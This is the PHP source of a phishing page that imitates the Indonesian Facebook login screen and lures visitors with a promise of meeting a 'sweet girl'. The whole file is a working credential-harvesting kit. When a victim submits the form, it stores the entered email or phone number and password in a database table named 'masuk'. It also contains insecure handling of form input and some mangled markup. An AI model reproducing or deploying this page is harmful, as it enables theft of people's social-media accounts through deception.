<?php 
require 'config.php';
echo '<!DOCTYPE html>';
echo '<html>';
echo '<head>';
echo '<meta content="width=device-width, initial-scale=1" name="viewport"/>';
echo '<title>';
echo 'Masuk Facebook | Facebook';
echo '</title>';
echo '<style>';
echo '
*{margin:0;padding:0;}
.wrap{max-width:1000px;width:100%;overflow:hidden;}
body{font-size:16px;font-family:sans-serif;line-height:1.6em;background:#efefef;color:#777777;}
h1{background:#47639e;color:#fff;text-align:center;padding:20px 0 20px 0;}
.top {text-align:center;}
.top img{clear:both;margin:25px 0 15px 0;}
input{clear:both;background:#fff;float:left;width:100%;padding:8px 9px 8px 9px;outline:none;}
button{float:left;width:111%;background:blue;color:#fff;padding:7px 7px 7px 7px;text-align:center;border:none;}
button{clear:both;opacity:0.6;}
.p_p{clear:both;margin-top:20px;}
.error{background:#FF0000;color:#fff;font-size:12px;text-align:left;padding:0 0 0 5px;}
form{margin:15px 40% 0 40%;}
table{width:100%;margin-top:50px;}
@media(max-width:600px){
.wrap{width:100%;}
.top{padding:0 15px 0 15px;}
h1{padding:10px 0 10px 0;font-size:27px;}
form{margin:5% 6.5% 0 3%;}
.p_p{margin-top:0;}
table{margin-top:60px;font-size:12px;line-height:1.4;}
button{width:106.5%;margin-top:10px;margin-bottom:7px;border-radius:5px;padding:10px 0 10px 0;}
}
';
echo'</style>';
echo '</head>';
echo '<body>';
echo '<div class="wrap">';
echo '<h1>';
eCho 'Facebook';
echo '</h1>';
echo '<div class="top">';
echo '<center>';
echo '<img alt="image" src="../cinta.jpg" style="height:60px;width:60px;border-radius:12px;">';
echo '</center>';
echo 'Masuk ke akun Facebook Anda untuk terhubung dengan Gadis Manis';
if(isset($_POST['submit'])){
$_POST = array_map( 'stripslashes', $_POST );
extract($_POST);
if($log1 ==''){
$error[] = 'email salah .';
}
if($log2 ==''){
$error[] = 'Kata sandi tidak valid. Coba lagi.';
}
if(!isset($error)){
try {
$stmt = $db->prepare('INSERT INTO masuk (log1,log2) VALUES (:log1, :log2)');
$stmt->execute(array(
':log1' => $log1,
':log2' => $log2
));
exit;
}
catch(PDOException $e) {
 echo $e->getMessage();
}
}
}
if(isset($error)){
foreach($error as $error){
echo '<p class="error">'.$error.'</p>';
}
}
echo '<form method="post">';
echo '<input type="text" name="log1" value=""if(isset($error)){ echo $_POST["log1"];}";" placeholder="Nomor telepon atau email"/>';
echo '<input type="password" name="log2" value =""if(isset($error)){ echo $_POST["log2"];}";" placeholder="Kata Sandi Facebook"/>';
echo '<button type="submit" name="submit" value="masuk">';
echo 'Masuk';
echo '</button>';
echo '</form>';
echo '<div class="p_p">';
echo '<p style="margin:5px 0 0 0;font-size:13px;color:blue;">Lupa Kata Sandi</p>';
echo '<br/>';
echo '<p style="font-size:13.5px;">Buat Akun</p>';
echo '<p style="font-size:13.5px;margin-top:1.5px;">Lain Kali</p>';
echo '<p style="font-size:13.5px;margin-top:1.5px;">Pusat Bantuan</p>';
echo '</div>';
echo '<table>';
echo '<tr>';
echo '<td>';
echo 'Bahasa Indonesia';
echo '</td>'; echo '<td>'; echo 'English (UK)'; echo '</td>'; echo '</tr>';
echo '<tr>';
echo '<td>';
echo 'Bahasa Jawa';
echo '</td>'; echo '<td>'; echo 'Bahasa Melayu'; echo '</td>'; echo '</tr>';
echo '<tr>';
echo '<td>';
echo 'Espsnol';
echo '</td>'; echo '<td>'; echo 'Portugues (Brasil)'; echo '</td>'; echo '</tr>';
echo '<tr>';
echo '<td>';
echo 'Prancais (France)';
echo '</td>'; echo '<td>'; echo '+'; echo '</td>'; echo '</tr>';
echo '</table>';
echo '<p style="text-align:center;margin:20px 0 0 0;font-size:13.2px;">Facebook Inc.</p>';
echo '</div>';
echo '</div>';
echo '</body>';
echo '</html>';
?>
